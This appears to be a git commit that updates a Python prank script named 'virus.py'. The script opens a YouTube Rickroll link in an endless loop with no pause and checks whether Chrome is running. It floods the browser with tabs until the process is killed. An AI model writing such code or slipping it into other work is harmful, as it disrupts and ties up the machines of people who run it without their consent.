714e1f477bf3728f7076ebbf6216b32f0cb2f181
Cassian0S0ares <masterticole@gmail.com>
2026-04-09 19:52:05 -0300

    hihi

--- virus.py
+++ virus.py
@@ -1,3 +1,21 @@
 import webbrowser
+import psutil
+
+url = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
+chrome_esta_aberto = False
+
 while True:
-    webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
+    esta_rodando = any(p.name().lower() == 'chrome.exe' for p in psutil.process_iter())
+    webbrowser.open(url)
+    if not esta_rodando and chrome_esta_aberto:
+        print('Chrome fechado. Abrindo nova aba...')
+        webbrowser.open(url)
+        chrome_esta_aberto = True
+    elif not esta_rodando and not chrome_esta_aberto:
+        print('Chrome não está aberto. Abrindo URL pela primeira vez...')
+        webbrowser.open(url)
+        chrome_esta_aberto = True
+    elif esta_rodando:
+        chrome_esta_aberto = True
+
+
